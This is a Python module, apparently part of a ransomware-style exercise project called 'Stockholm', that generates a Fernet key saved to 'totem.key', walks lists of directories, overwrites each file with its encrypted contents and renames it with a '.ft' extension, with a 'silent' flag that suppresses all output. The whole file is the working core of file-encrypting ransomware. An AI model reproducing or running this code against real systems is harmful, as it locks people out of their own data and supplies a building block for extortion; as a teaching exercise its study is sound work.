from cryptography.fernet import Fernet
from os import rename
from os.path import splitext
from print_action import print_encryption, print_encrypt_file

# Funcion que genera el totem [pass]
def keygen():
    key = Fernet.generate_key()
    with open("totem.key","wb") as totem:
        totem.write(key)

#Funcion que lee el valor del totem
def getkey():
    try:
        keyfile = open("totem.key","rb").read()
        return keyfile    
    except:
        return None

# Function for encrypt a directory
def encrypt_dirs(lst_dir=[],silent=False):
    if len(lst_dir) > 0:
        # Verification of key
        while getkey() == None:
                keygen()
        print_encryption(silent)
        key = getkey()
        for index_dir in lst_dir:
                for lst_files,dir in index_dir.items():
                    if len(dir) > 0:
                        for file in index_dir[lst_files]:
                            res = encrypt_file(file=file,key=key,silent=silent)
                            print_encrypt_file(result=res,file=file,silent=silent)
                    else:
                        if silent == False:
                            print("""[X] {}
                            NO FILES TO ENCRYPT -- ENCRYPTION DISABLED!!"""
                            .format(lst_files))
        if silent == False:
            print("*** STOPING STOCKHOLM ***")

# Function for encrypt a file
def encrypt_file(file, key, silent=False):
    try:
        # Module Fernet to encrypt
        fern = Fernet(key)
        with open(file,"rb") as target_r:
            target_data = target_r.read()
        # Data encrypted from file
        data_encrypt = fern.encrypt(target_data)
        # Write encrypted data on file
        with open(file, "wb") as target_w:
            target_w.write(data_encrypt)
        # Rename the file
        name,ext = splitext(file)
        if ext != '.ft':
            rename(file,file+'.ft')
        del(name)
        return True
    except Exception:
        return False

